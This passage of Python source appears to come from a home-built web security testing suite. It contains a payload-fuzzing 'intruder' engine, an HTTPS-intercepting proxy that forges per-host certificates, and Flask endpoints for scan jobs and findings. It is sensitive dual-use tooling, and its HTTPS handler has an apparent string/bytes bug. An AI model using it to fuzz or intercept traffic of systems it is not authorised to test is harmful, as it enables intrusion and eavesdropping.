                normalized.append([key, value])
        elif isinstance(headers, list):
            for item in headers:
                if isinstance(item, dict):
                    for key, value in item.items():
                        normalized.append([key, value])
                elif isinstance(item, list) and len(item) >= 2:
                    normalized.append([str(item[0]), str(item[1])])
        return normalized

    def _prepare_payloads(self, config):
        """Prepare payloads based on configuration"""
        payloads = config.get('payloads', [])

        # If payload type is predefined, use those payloads
        payload_type = config.get('payload_type')
        if payload_type in self.payload_sets and not payloads:
            payloads = self.payload_sets[payload_type]['payloads']

        # Handle file upload if payloads is a file path
        if isinstance(payloads, str) and os.path.exists(payloads):
            try:
                with open(payloads, 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip()]
            except:
                payloads = []

        # Ensure payloads is a list
        if not isinstance(payloads, list):
            payloads = [str(payloads)]

        # Deduplicate payloads
        seen = set()
        unique_payloads = []
        for payload in payloads:
            if payload not in seen:
                seen.add(payload)
                unique_payloads.append(payload)

        return unique_payloads

    def _calculate_total_payloads(self, job):
        """Calculate total payloads based on attack type"""
        payloads = job['payloads']

        if job['attack_type'] == 'sniper':
            # One payload position, all payloads
            return len(payloads)
        elif job['attack_type'] == 'battering_ram':
            # All payload positions get the same payload
            return len(payloads)
        elif job['attack_type'] == 'pitchfork':
            # Multiple payload sets, same length
            # For simplicity, assume payloads is list of lists
            if payloads and isinstance(payloads[0], list):
                return len(payloads[0]) if payloads[0] else 0
            return len(payloads)
        elif job['attack_type'] == 'cluster_bomb':
            # Cartesian product of payload sets
            if payloads and isinstance(payloads, list) and all(isinstance(p, list) for p in payloads):
                total = 1
                for p_set in payloads:
                    total *= len(p_set)
                return total
            return len(payloads)

        return len(payloads)

    def _validate_attack_config(self, job):
        """Validate attack configuration"""
        if not job['payloads']:
            raise ValueError("No payloads specified")

        if job['attack_type'] not in ['sniper', 'battering_ram', 'pitchfork', 'cluster_bomb']:
            raise ValueError(f"Invalid attack type: {job['attack_type']}")

        # Check for payload markers if needed
        if job['attack_type'] in ['sniper', 'battering_ram']:
            if '§' not in job['target_url'] and '§' not in job['body_template']:
                raise ValueError("No payload position markers (§) found in target")

        # Validate payload sets for pitchfork and cluster bomb
        if job['attack_type'] in ['pitchfork', 'cluster_bomb']:
            if not isinstance(job['payloads'], list) or not job['payloads']:
                raise ValueError("Invalid payload sets for attack type")

            if job['attack_type'] == 'pitchfork':
                # All payload sets must have same length
                lengths = [len(p_set) for p_set in job['payloads'] if isinstance(p_set, list)]
                if len(set(lengths)) > 1:
                    raise ValueError("Payload sets for pitchfork attack must have equal length")

    def _save_job_to_db(self, job):
        """Save job to database with thread-safe connection"""
        try:
            with DB.cursor() as cur:
                cur.execute("""INSERT INTO intruder_jobs 
                            (id, timestamp, name, status, target_url, method, headers,
                             body_template, payload_type, payloads, payload_count, results,
                             attack_type, grep_strings, extract_grep, project, progress)
                            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                            (job['id'], job['created'], job['name'], job['status'],
                             job['target_url'], job['method'], json.dumps(job['headers']),
                             job['body_template'], job['payload_type'], json.dumps(job['payloads']),
                             job['stats']['total'], json.dumps(job['results']),
                             job['attack_type'], json.dumps(job['grep_strings']),
                             json.dumps(job['extract_grep']), job['project'],
                             job['progress']))
        except Exception as e:
            print(f"Error saving job to database: {e}")
            raise

    def start_job(self, job_id: str) -> Dict:
        """Start an intruder job with validation"""
        try:
            with self.lock:
                if job_id not in self.active_jobs:
                    raise ValueError(f"Job {job_id} not found")

                job = self.active_jobs[job_id]

                # Check if job can be started
                if job['status'] == 'Running':
                    raise ValueError("Job is already running")
                elif job['status'] == 'Completed':
                    raise ValueError("Job has already completed")
                elif job['status'] == 'Stopped':
                    raise ValueError("Job was stopped and cannot be restarted")

                # Update job status
                job['status'] = 'Running'
                job['updated'] = datetime.now(timezone.utc).isoformat()
                job['stats']['sent'] = 0
                job['stats']['successful'] = 0
                job['stats']['failed'] = 0

            # Update database
            self._update_job_status(job_id, 'Running')

            # Start attack in background thread
            thread = threading.Thread(
                target=self._execute_attack,
                args=(job_id,),
                name=f"IntruderAttack-{job_id[:8]}"
            )
            thread.daemon = True
            thread.start()

            return {
                'success': True,
                'job_id': job_id,
                'message': f"Job '{job['name']}' started successfully",
                'status': 'Running'
            }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'message': f"Failed to start job: {str(e)}"
            }

    def _update_job_status(self, job_id: str, status: str, progress: float = None, results: List = None):
        """Update job status in database"""
        try:
            with DB.cursor() as cur:
                if progress is not None and results is not None:
                    cur.execute("""UPDATE intruder_jobs 
                                SET status=?, progress=?, results=?, updated=?
                                WHERE id=?""",
                                (status, progress, json.dumps(results) if results else '[]',
                                 datetime.now(timezone.utc).isoformat(), job_id))
                elif progress is not None:
                    cur.execute("""UPDATE intruder_jobs 
                                SET status=?, progress=?, updated=?
                                WHERE id=?""",
                                (status, progress, datetime.now(timezone.utc).isoformat(), job_id))
                else:
                    cur.execute("""UPDATE intruder_jobs 
                                SET status=?, updated=?
                                WHERE id=?""",
                                (status, datetime.now(timezone.utc).isoformat(), job_id))
        except Exception as e:
            print(f"Error updating job status: {e}")

    def stop_job(self, job_id: str) -> Dict:
        """Stop a running intruder job"""
        try:
            with self.lock:
                if job_id not in self.active_jobs:
                    raise ValueError(f"Job {job_id} not found")

                job = self.active_jobs[job_id]

                if job['status'] != 'Running':
                    raise ValueError(f"Cannot stop job with status: {job['status']}")

                job['status'] = 'Stopped'
                job['updated'] = datetime.now(timezone.utc).isoformat()

            # Update database
            self._update_job_status(job_id, 'Stopped', job['progress'])

            return {
                'success': True,
                'job_id': job_id,
                'message': f"Job '{job['name']}' stopped successfully",
                'status': 'Stopped'
            }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'message': f"Failed to stop job: {str(e)}"
            }

    def get_job_status(self, job_id: str) -> Dict:
        """Get detailed job status"""
        with self.lock:
            if job_id not in self.active_jobs:
                # Try to load from database
                try:
                    with DB.cursor() as cur:
                        row = cur.execute("""SELECT * FROM intruder_jobs WHERE id=?""",
                                          (job_id,)).fetchone()

                        if row:
                            job = {
                                'id': row['id'],
                                'name': row['name'],
                                'status': row['status'],
                                'progress': row['progress'],
                                'created': row['timestamp'],
                                'stats': {
                                    'total': row['payload_count'],
                                    'sent': 0,  # Would need to calculate
                                    'successful': 0,
                                    'failed': 0
                                }
                            }
                            return {
                                'success': True,
                                'job': job,
                                'from_cache': False
                            }
                except Exception as e:
                    print(f"Error loading job from DB: {e}")

                return {
                    'success': False,
                    'error': 'Job not found',
                    'job_id': job_id
                }

            job = self.active_jobs[job_id]

            # Calculate additional stats
            successful = sum(1 for r in job['results'] if r.get('status_code', 0) < 400)
            failed = len(job['results']) - successful

            return {
                'success': True,
                'job': {
                    'id': job['id'],
                    'name': job['name'],
                    'status': job['status'],
                    'progress': job['progress'],
                    'created': job['created'],
                    'updated': job['updated'],
                    'stats': {
                        'total': job['stats']['total'],
                        'sent': len(job['results']),
                        'successful': successful,
                        'failed': failed,
                        'average_time': job['stats'].get('average_time', 0)
                    },
                    'target_url': job['target_url'],
                    'attack_type': job['attack_type'],
                    'payload_type': job['payload_type']
                },
                'from_cache': True
            }

    def list_jobs(self, project: str = None) -> Dict:
        """List all intruder jobs"""
        try:
            with DB.cursor() as cur:
                if project:
                    rows = cur.execute("""SELECT id, timestamp, name, status, target_url, 
                                         attack_type, payload_count, progress
                                         FROM intruder_jobs 
                                         WHERE project=?
                                         ORDER BY datetime(timestamp) DESC
                                         LIMIT 100""",
                                       (project,)).fetchall()
                else:
                    rows = cur.execute("""SELECT id, timestamp, name, status, target_url, 
                                         attack_type, payload_count, progress
                                         FROM intruder_jobs 
                                         ORDER BY datetime(timestamp) DESC
                                         LIMIT 100""").fetchall()

                jobs = []
                for row in rows:
                    jobs.append({
                        'id': row['id'],
                        'timestamp': row['timestamp'],
                        'name': row['name'],
                        'status': row['status'],
                        'target_url': row['target_url'],
                        'attack_type': row['attack_type'],
                        'payload_count': row['payload_count'],
                        'progress': row['progress']
                    })

                # Add active jobs not yet in database
                with self.lock:
                    for job_id, job in self.active_jobs.items():
                        if not any(j['id'] == job_id for j in jobs):
                            jobs.insert(0, {
                                'id': job['id'],
                                'timestamp': job['created'],
                                'name': job['name'],
                                'status': job['status'],
                                'target_url': job['target_url'],
                                'attack_type': job['attack_type'],
                                'payload_count': job['stats']['total'],
                                'progress': job['progress']
                            })

                return {
                    'success': True,
                    'total': len(jobs),
                    'jobs': jobs
                }

        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'message': f"Failed to list jobs: {str(e)}"
            }


# ================= PROXY ENGINE =================
class ProxyEngine:
    """Advanced proxy engine with interception and modification"""

    def __init__(self):
        self.intercept_queue = {}
        self.intercept_enabled = True
        self.match_replace_rules = []
        self.ssl_strip = False
        self.upstream_proxy = None
        self.filter_rules = []

    def handle_client(self, client_socket):
        """Handle incoming client connection"""
        try:
            # Get first data to determine if it's SSL or HTTP
            first_data = client_socket.recv(8192)
            if not first_data:
                client_socket.close()
                return

            if first_data.startswith(b"CONNECT"):
                # HTTPS/SSL connection
                self._handle_https(client_socket, first_data)
            else:
                # HTTP connection
                self._handle_http(client_socket, first_data)

        except Exception as e:
            print(f"Error handling client: {e}")
            try:
                client_socket.close()
            except:
                pass

    def _handle_https(self, client_socket, connect_request):
        """Handle HTTPS CONNECT request"""
        try:
            # Parse CONNECT request
            lines = connect_request.split(b'\r\n')
            connect_line = lines[0].decode('utf-8', errors='ignore')
            _, host_port, _ = connect_line.split()
            host, port = host_port.split(b':') if b':' in host_port else (host_port, b'443')
            host = host.decode()
            port = int(port)

            # Send CONNECT success
            client_socket.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")

            # Get certificate for host
            cert_path, key_path = CA.get_certificate(host)

            # Create SSL context
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert_path, key_path)

            # Wrap client socket
            ssl_client = ctx.wrap_socket(client_socket, server_side=True)

            # Connect to upstream
            upstream = socket.create_connection((host, port), timeout=30)
            upstream_ssl = ssl.create_default_context().wrap_socket(
                upstream, server_hostname=host
            )

            # Handle interception
            self._proxy_ssl_traffic(ssl_client, upstream_ssl, host, port)

        except Exception as e:
            print(f"HTTPS error: {e}")

    def _handle_http(self, client_socket, first_data):
        """Handle HTTP request"""
        try:
            # Parse host from request
            match = re.search(br"Host:\s*([^\r\n]+)", first_data)
            if not match:
                client_socket.close()
                return

            host_port = match.group(1).decode().split(':')
            host = host_port[0]
            port = int(host_port[1]) if len(host_port) > 1 else 80

            # Intercept if enabled
            if self.intercept_enabled:
                req_id = str(time.time())
                intercepted = self._intercept_request(req_id, first_data)
                if intercepted is None:
                    client_socket.close()
                    return
                first_data = intercepted

            # Connect to upstream
            upstream = socket.create_connection((host, port), timeout=30)

            # Send request
            upstream.sendall(first_data)

            # Get response
            response = self._receive_response(upstream)

            # Intercept response if enabled
            if self.intercept_enabled:
                req_id = str(time.time())
                intercepted = self._intercept_response(req_id, response)
                if intercepted is None:
                    client_socket.close()
                    upstream.close()
                    return
                response = intercepted

            # Send response to client
            client_socket.sendall(response)

            # Save to history
            self._save_request("http", host, port, first_data, response)

            # Continue proxying if keep-alive
            self._proxy_remaining(client_socket, upstream, host, port)

        except Exception as e:
            print(f"HTTP error: {e}")
            try:
                client_socket.close()
            except:
                pass

    def _intercept_request(self, req_id, request_data):
        """Intercept and potentially modify request"""
        if not self.intercept_enabled:
            return request_data

        self.intercept_queue[req_id] = {
            'type': 'request',
            'data': request_data,
            'decision': None,
            'modified': request_data
        }

        # Wait for decision
        for _ in range(100):  # 5 second timeout
            if self.intercept_queue[req_id]['decision'] is not None:
                break
            time.sleep(0.05)

        item = self.intercept_queue.pop(req_id, None)
        if not item or item['decision'] == 'drop':
            return None

        return item['modified']

    def _intercept_response(self, req_id, response_data):
        """Intercept and potentially modify response"""
        if not self.intercept_enabled:
            return response_data

        self.intercept_queue[req_id] = {
            'type': 'response',
            'data': response_data,
            'decision': None,
            'modified': response_data
        }

        # Wait for decision
        for _ in range(100):
            if self.intercept_queue[req_id]['decision'] is not None:
                break
            time.sleep(0.05)

        item = self.intercept_queue.pop(req_id, None)
        if not item or item['decision'] == 'drop':
            return None

        return item['modified']

    def _save_request(self, scheme, host, port, request, response):
        """Save request/response to database"""
        try:
            req_id = str(uuid.uuid4())
            parsed_req = RequestParser.parse_request(request)
            parsed_resp = RequestParser.parse_response(response) if response else {}

            if not parsed_req:
                return

            with DB.cursor() as cur:
                cur.execute("""INSERT INTO requests 
                            (id, timestamp, method, scheme, host, port, path, query, fragment,
                             headers, body, response_code, response_headers, response_body,
                             response_time, request_size, response_size, project)
                            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                            (req_id, datetime.now(timezone.utc).isoformat(),
                             parsed_req['method'], scheme, host, port,
                             parsed_req['path'], parsed_req['query'], parsed_req['fragment'],
                             json.dumps(parsed_req['headers']), parsed_req['body'],
                             parsed_resp.get('status_code', 0),
                             json.dumps(parsed_resp.get('headers', [])),
                             parsed_resp.get('body', b''),
                             0.1,  # Placeholder
                             len(request), len(response) if response else 0,
                             GLOBAL.active_project['name']))

                # Auto-scan if enabled
                scanner = AdvancedVulnerabilityScanner()
                findings = scanner.scan_request(parsed_req, parsed_resp)

                for finding in findings:
                    scan_id = str(uuid.uuid4())
                    cur.execute("""INSERT INTO scanner_results 
                                (id, timestamp, issue_type, severity, url, host, path,
                                 description, confidence, remediation, evidence, request_id, project)
                                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                                (scan_id, datetime.now(timezone.utc).isoformat(),
                                 finding['type'], finding['severity'],
                                 f"{scheme}://{host}:{port}{parsed_req['path']}",
                                 host, parsed_req['path'],
                                 finding['description'], finding['confidence'],
                                 finding['remediation'], finding['evidence'],
                                 req_id, GLOBAL.active_project['name']))

        except Exception as e:
            print(f"Error saving request: {e}")

    def _receive_response(self, socket_obj, timeout=30):
        """Receive complete HTTP response"""
        socket_obj.settimeout(timeout)
        response = b''

        try:
            while True:
                chunk = socket_obj.recv(4096)
                if not chunk:
                    break
                response += chunk

                # Check if we have complete headers
                if b'\r\n\r\n' in response:
                    headers_end = response.find(b'\r\n\r\n') + 4
                    headers = response[:headers_end]

                    # Check Content-Length
                    match = re.search(br'Content-Length:\s*(\d+)', headers, re.IGNORECASE)
                    if match:
                        content_length = int(match.group(1))
                        body_start = headers_end
                        if len(response) - body_start >= content_length:
                            break
                    else:
                        # No Content-Length, chunked or close connection
                        if b'Transfer-Encoding: chunked' in headers:
                            # Handle chunked encoding
                            if b'0\r\n\r\n' in response[headers_end:]:
                                break
                        else:
                            # Connection close
                            # Just read until close
                            try:
                                while True:
                                    more = socket_obj.recv(4096)
                                    if not more:
                                        break
                                    response += more
                            except:
                                pass
                            break
        except socket.timeout:
            pass

        return response

    def _proxy_ssl_traffic(self, client, server, host, port):
        """Proxy SSL traffic between client and server"""

        def pipe(source, dest, direction):
            try:
                while not STOP_EVENT.is_set():
                    data = source.recv(8192)
                    if not data:
                        break

                    # Intercept if needed
                    if direction == 'client_to_server' and self.intercept_enabled:
                        req_id = str(time.time())
                        data = self._intercept_request(req_id, data)
                        if data is None:
                            break

                    dest.sendall(data)
            except:
                pass
            finally:
                try:
                    source.close()
                except:
                    pass

        # Start bidirectional proxying
        client_to_server = threading.Thread(
            target=pipe, args=(client, server, 'client_to_server')
        )
        server_to_client = threading.Thread(
            target=pipe, args=(server, client, 'server_to_client')
        )

        client_to_server.daemon = True
        server_to_client.daemon = True

        client_to_server.start()
        server_to_client.start()

        client_to_server.join()
        server_to_client.join()

    def _proxy_remaining(self, client, server, host, port):
        """Proxy remaining traffic for keep-alive connections"""
        try:
            # Simplified - just close for now
            # Real implementation would handle keep-alive
            client.close()
            server.close()
        except:
            pass


# ================= FLASK APP =================
app = Flask(__name__)
proxy_engine = ProxyEngine()
intruder_engine = IntruderEngine()
scanner = AdvancedVulnerabilityScanner()


# ================= WEB UI ROUTES =================
@app.route("/")
def index():
    """Main UI page"""
    return render_template_string(ADVANCED_UI_TEMPLATE)


@app.route("/api/status")
def api_status():
    """Get system status"""
    with DB.cursor() as cur:
        request_count = cur.execute(
            "SELECT COUNT(*) FROM requests WHERE project=?",
            (GLOBAL.active_project['name'],)
        ).fetchone()[0]

        issue_count = cur.execute(
            "SELECT COUNT(*) FROM scanner_results WHERE project=? AND fixed=0",
            (GLOBAL.active_project['name'],)
        ).fetchone()[0]

    return jsonify({
        "proxy_running": True,
        "intercept_enabled": proxy_engine.intercept_enabled,
        "active_project": GLOBAL.active_project['name'],
        "request_count": request_count,
        "issue_count": issue_count
    })


@app.route("/api/history")
def api_history():
    """Get request history"""
    with DB.cursor() as cur:
        rows = cur.execute("""
            SELECT id, timestamp, method, scheme, host, port, path, 
                   response_code, request_size, response_size, response_time, 
                   bookmarked, highlighted
            FROM requests 
            WHERE project=?
            ORDER BY datetime(timestamp) DESC 
            LIMIT 500
        """, (GLOBAL.active_project['name'],)).fetchall()

        requests = []
        for row in rows:
            requests.append({
                "id": row[0],
                "timestamp": row[1],
                "method": row[2],
                "scheme": row[3],
                "host": row[4],
                "port": row[5],
                "path": row[6],
                "code": row[7],
                "request_size": row[8],
                "response_size": row[9],
                "response_time": round(row[10], 3) if row[10] else 0,
                "bookmarked": bool(row[11]),
                "highlighted": bool(row[12])
            })

    return jsonify(requests)


@app.route("/api/request/<req_id>")
def api_request_detail(req_id):
    """Get detailed request/response"""
    with DB.cursor() as cur:
        row = cur.execute("""
            SELECT method, scheme, host, port, path, query, fragment,
                   headers, body, response_code, response_headers, response_body,
                   notes, tags, comment
            FROM requests 
            WHERE id=?
        """, (req_id,)).fetchone()

        if not row:
            return jsonify({"error": "Request not found"}), 404

        return jsonify({
            "method": row[0],
            "scheme": row[1],
            "host": row[2],
            "port": row[3],
            "path": row[4],
            "query": row[5],
            "fragment": row[6],
            "headers": json.loads(row[7]) if row[7] else [],
            "body": row[8].decode('utf-8', errors='ignore') if row[8] else "",
            "response_code": row[9],
            "response_headers": json.loads(row[10]) if row[10] else [],
            "response_body": row[11].decode('utf-8', errors='ignore') if row[11] else "",
            "notes": row[12] or "",
            "tags": row[13] or "",
            "comment": row[14] or ""
        })


@app.route("/api/intercept/toggle", methods=["POST"])
def api_intercept_toggle():
    """Toggle interception"""
    data = request.json
    proxy_engine.intercept_enabled = data.get('enabled', True)
    return jsonify({"enabled": proxy_engine.intercept_enabled})


@app.route("/api/intercept/next")
def api_intercept_next():
    """Get next item for interception"""
    for req_id, item in proxy_engine.intercept_queue.items():
        if item['decision'] is None:
            return jsonify({
                "id": req_id,
                "type": item['type'],
                "data": item['data'].decode('utf-8', errors='ignore')
            })
    return jsonify({})


@app.route("/api/intercept/<req_id>", methods=["POST"])
def api_intercept_action(req_id):
    """Handle interception decision"""
    data = request.json
    action = data.get('action')
    modified = data.get('modified')

    if req_id in proxy_engine.intercept_queue:
        if action in ['forward', 'drop']:
            proxy_engine.intercept_queue[req_id]['decision'] = action
            if modified and action == 'forward':
                proxy_engine.intercept_queue[req_id]['modified'] = modified.encode()

    return jsonify({"success": True})


@app.route("/api/scanner/results")
def api_scanner_results():
    """Get scanner results"""
    with DB.cursor() as cur:
        rows = cur.execute("""
            SELECT id, timestamp, issue_type, severity, url, host, path,
                   description, confidence, remediation, evidence, 
                   fixed, false_positive, reviewed
            FROM scanner_results 
            WHERE project=?
            ORDER BY 
                CASE severity 
                    WHEN 'Critical' THEN 1
                    WHEN 'High' THEN 2
                    WHEN 'Medium' THEN 3
                    WHEN 'Low' THEN 4
                    ELSE 5
                END,
                datetime(timestamp) DESC
            LIMIT 200
        """, (GLOBAL.active_project['name'],)).fetchall()

        results = []
        for row in rows:
            results.append({
                "id": row[0],
                "timestamp": row[1],
                "type": row[2],
                "severity": row[3],
                "url": row[4],
                "host": row[5],
                "path": row[6],
                "description": row[7],
                "confidence": row[8],
                "remediation": row[9],
                "evidence": row[10],
                "fixed": bool(row[11]),
                "false_positive": bool(row[12]),
                "reviewed": bool(row[13])
            })

    return jsonify(results)


def init_scan_tables():
    """Initialize scan-related database tables"""
    with DB.cursor() as cur:
        # Check if scan_id column exists
        try:
            cur.execute("SELECT scan_id FROM scanner_results LIMIT 1")
        except sqlite3.OperationalError:
            # Add scan_id column if it doesn't exist
            print("[INIT] Adding scan_id column to scanner_results table")
            cur.execute("ALTER TABLE scanner_results ADD COLUMN scan_id TEXT")
            cur.execute("CREATE INDEX IF NOT EXISTS idx_scanner_scan_id ON scanner_results(scan_id)")

        # Create audit log table if it doesn't exist
        cur.execute("""CREATE TABLE IF NOT EXISTS project_audit_log(
            id TEXT PRIMARY KEY,
            timestamp TEXT,
            user TEXT,
            action TEXT,
            previous_project TEXT,
            new_project TEXT,
            details TEXT
        )""")

        print("[INIT] Database tables initialized")


# Initialize tables at startup
init_scan_tables()


@app.route("/api/scanner/active")
def api_scanner_active():
    """Get list of active scans"""
    try:
        with DB.cursor() as cur:
            # Get scans started but not completed
            rows = cur.execute("""
                SELECT DISTINCT scan_id, MAX(timestamp) as last_update,
                       SUM(CASE WHEN issue_type = 'Scan Completed' THEN 1 ELSE 0 END) as completed,
                       SUM(CASE WHEN issue_type = 'Scan Error' THEN 1 ELSE 0 END) as error,
                       COUNT(*) as total_entries
                FROM scanner_results 
                WHERE scan_id IS NOT NULL 
                GROUP BY scan_id
                HAVING completed = 0 AND error = 0
                ORDER BY last_update DESC
                LIMIT 10
            """).fetchall()

            active_scans = []
            for row in rows:
                # Get scan details
                scan_row = cur.execute("""
                    SELECT url, issue_type, description, timestamp 
                    FROM scanner_results 
                    WHERE scan_id = ? 
                    ORDER BY timestamp ASC 
                    LIMIT 1
                """, (row['scan_id'],)).fetchone()

                if scan_row:
                    active_scans.append({
                        'scan_id': row['scan_id'],
                        'url': scan_row['url'],
                        'status': 'running',
                        'started': scan_row['timestamp'],
                        'last_update': row['last_update'],
                        'progress_entries': row['total_entries']
                    })

            return jsonify({
                'success': True,
                'active_scans': active_scans,
                'total': len(active_scans)
            })

    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


# Add a progress tracking endpoint
@app.route("/api/scanner/progress/<scan_id>")
def api_scanner_progress(scan_id: str):
    """Get scan progress"""
    try:
        with DB.cursor() as cur:
            # Get total entries for this scan
            total = cur.execute(
                "SELECT COUNT(*) FROM scanner_results WHERE scan_id = ?",
                (scan_id,)
            ).fetchone()[0]

            # Check if completed
            completed = cur.execute(
                "SELECT COUNT(*) FROM scanner_results WHERE scan_id = ? AND issue_type = 'Scan Completed'",
                (scan_id,)
            ).fetchone()[0] > 0

            error = cur.execute(
                "SELECT COUNT(*) FROM scanner_results WHERE scan_id = ? AND issue_type = 'Scan Error'",
                (scan_id,)
            ).fetchone()[0] > 0

            # Get findings count
            findings = cur.execute(
                """SELECT COUNT(*) FROM scanner_results 
                WHERE scan_id = ? AND issue_type NOT IN 
                ('Scan Started', 'Scan Completed', 'Scan Error', 'Scan Cancelled')""",
                (scan_id,)
            ).fetchone()[0]

            status = 'completed' if completed else 'error' if error else 'running'

            return jsonify({
                'success': True,
                'scan_id': scan_id,
                'status': status,
                'total_entries': total,
                'findings_count': findings,
                'progress': min(95, (total * 10)) if not completed else 100  # Simple progress calculation
            })

    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


# Update the scanner status endpoint to include progress
@app.route("/api/scanner/status/<scan_id>")
def api_scanner_status(scan_id: str):
    """Get scan status and results"""
    try:
        with DB.cursor() as cur:
            # First check if scan exists
            scan_exists = cur.execute(
                "SELECT COUNT(*) FROM scanner_results WHERE scan_id = ?",
                (scan_id,)
            ).fetchone()[0] > 0

            if not scan_exists:
                return jsonify({
                    'success': False,
                    'error': 'Scan not found',
                    'scan_id': scan_id
                }), 404

            # Get scan progress
            progress_result = cur.execute("""
                SELECT 
                    SUM(CASE WHEN issue_type = 'Scan Completed' THEN 1 ELSE 0 END) as completed,
                    SUM(CASE WHEN issue_type = 'Scan Error' THEN 1 ELSE 0 END) as error,
                    COUNT(*) as total_entries
                FROM scanner_results 
                WHERE scan_id = ?
            """, (scan_id,)).fetchone()

            completed = progress_result['completed'] > 0
            error = progress_result['error'] > 0
            total_entries = progress_result['total_entries'] or 0

            # Calculate progress percentage
            if completed:
                progress = 100
                status = 'completed'
            elif error:
                progress = 0
                status = 'error'
            else:
                # Estimate progress based on entries (max 95% until completed)
                progress = min(95, (total_entries * 5))
                status = 'running'

            # Get scan summary
            summary = cur.execute("""
                SELECT COUNT(*) as total,
                       SUM(CASE WHEN severity = 'Critical' THEN 1 ELSE 0 END) as critical,
                       SUM(CASE WHEN severity = 'High' THEN 1 ELSE 0 END) as high,
                       SUM(CASE WHEN severity = 'Medium' THEN 1 ELSE 0 END) as medium,
                       SUM(CASE WHEN severity = 'Low' THEN 1 ELSE 0 END) as low,
                       SUM(CASE WHEN severity = 'Info' THEN 1 ELSE 0 END) as info
                FROM scanner_results 
                WHERE scan_id = ? AND issue_type NOT IN ('Scan Started', 'Scan Completed', 'Scan Error', 'Scan Cancelled')
            """, (scan_id,)).fetchone()

            # Get scan start info
            scan_info = cur.execute("""
                SELECT url, timestamp, description 
                FROM scanner_results 
                WHERE scan_id = ? AND issue_type = 'Scan Started'
                ORDER BY timestamp ASC 
                LIMIT 1
            """, (scan_id,)).fetchone()

            # Get recent findings
            findings = cur.execute("""
                SELECT id, timestamp, issue_type, severity, url, description,
                       confidence, remediation, cvss_score
                FROM scanner_results 
                WHERE scan_id = ? AND issue_type NOT IN ('Scan Started', 'Scan Completed', 'Scan Error', 'Scan Cancelled')
                ORDER BY 
                    CASE severity 
                        WHEN 'Critical' THEN 1
                        WHEN 'High' THEN 2
                        WHEN 'Medium' THEN 3
                        WHEN 'Low' THEN 4
                        ELSE 5
                    END,
                    timestamp DESC
                LIMIT 20
            """, (scan_id,)).fetchall()

            findings_list = []
            for row in findings:
                findings_list.append({
                    'id': row['id'],
                    'timestamp': row['timestamp'],
                    'type': row['issue_type'],
                    'severity': row['severity'],
                    'url': row['url'],
                    'description': row['description'],
                    'confidence': row['confidence'],
                    'remediation': row['remediation'],
                    'cvss_score': row['cvss_score']
                })

            return jsonify({
                'success': True,
                'scan_id': scan_id,
                'status': status,
                'progress': progress,
                'url': scan_info['url'] if scan_info else 'Unknown',
                'started': scan_info['timestamp'] if scan_info else None,
                'description': scan_info['description'] if scan_info else 'Security scan',
                'summary': {
                    'total': summary['total'] or 0,
                    'critical': summary['critical'] or 0,
                    'high': summary['high'] or 0,
                    'medium': summary['medium'] or 0,
                    'low': summary['low'] or 0,
                    'info': summary['info'] or 0
                },
                'recent_findings': findings_list,
                'total_entries': total_entries
            })

    except Exception as e:
        print(f"Error getting scan status: {e}")
        return jsonify({
            'success': False,
            'error': 'Failed to get scan status',
            'message': str(e)
        }), 500


# Add a function to monitor and clean up old scans
def cleanup_old_scans():
    """Clean up scan data older than 7 days"""
    try:
        cutoff = datetime.now(timezone.utc) - timedelta(days=7)

        with DB.cursor() as cur:
            # Find old scans
            old_scans = cur.execute("""
                SELECT DISTINCT scan_id 
                FROM scanner_results 
                WHERE timestamp < ? AND scan_id IS NOT NULL
            """, (cutoff.isoformat(),)).fetchall()

            for row in old_scans:
                scan_id = row['scan_id']
                print(f"[CLEANUP] Removing old scan: {scan_id}")

                # Delete scan results
                cur.execute("DELETE FROM scanner_results WHERE scan_id = ?", (scan_id,))

        print(f"[CLEANUP] Cleanup completed")

    except Exception as e:
        print(f"[CLEANUP] Error: {e}")


# Start cleanup thread
cleanup_thread = threading.Thread(
    target=lambda: (time.sleep(3600), cleanup_old_scans()),
    daemon=True,
    name="ScanCleanup"
)
cleanup_thread.start()





@app.route("/api/scanner/scan", methods=["POST"])
def api_scanner_scan():
    """Start a new comprehensive security scan"""
    try:
        data = request.json
        if not data:
            return jsonify({
                "success": False,
                "error": "No data provided"
            }), 400

        url = data.get('url')
        scan_config = data.get('config', {})

        # Validate URL
        if not url:
            return jsonify({
                "success": False,
                "error": "URL is required"
            }), 400

        # Parse and validate URL
        try:
            parsed_url = urllib.parse.urlparse(url)
            if not parsed_url.scheme or not parsed_url.netloc:
                return jsonify({
                    "success": False,
                    "error": "Invalid URL format"
                }), 400
        except Exception as e:
            return jsonify({
                "success": False,
                "error": f"Invalid URL: {str(e)}"
            }), 400

        # Create scan job
        scan_id = str(uuid.uuid4())

        # Determine scan type
        scan_type = scan_config.get('scan_type', 'passive')
        scan_depth = scan_config.get('depth', 'medium')
        check_types = scan_config.get('checks', 'all')

        # Start scan in background thread
        thread = threading.Thread(
            target=execute_security_scan,
            args=(scan_id, url, scan_config, GLOBAL.active_project['name']),
            name=f"SecurityScan-{scan_id[:8]}"
        )
        thread.daemon = True
        thread.start()

        # Log scan initiation
        with DB.cursor() as cur:
            cur.execute("""INSERT INTO scanner_results 
                        (id, timestamp, issue_type, severity, url, description,
                         confidence, remediation, evidence, project, scan_id)
                        VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
                        (str(uuid.uuid4()), datetime.now(timezone.utc).isoformat(),
                         "Scan Started", "Info", url,
                         f"Security scan initiated for {url}",
                         "High", "N/A", json.dumps({"scan_config": scan_config}),
                         GLOBAL.active_project['name'], scan_id))

        return jsonify({
            "success": True,
            "scan_id": scan_id,
            "message": f"Security scan started for {url}",
            "scan_type": scan_type,
            "estimated_time": estimate_scan_time(scan_type, scan_depth),
            "status_endpoint": f"/api/scanner/status/{scan_id}"
        })

    except Exception as e:
        print(f"Scan initiation error: {e}")
        return jsonify({
            "success": False,
            "error": "Failed to start scan",
            "message": str(e)
        }), 500


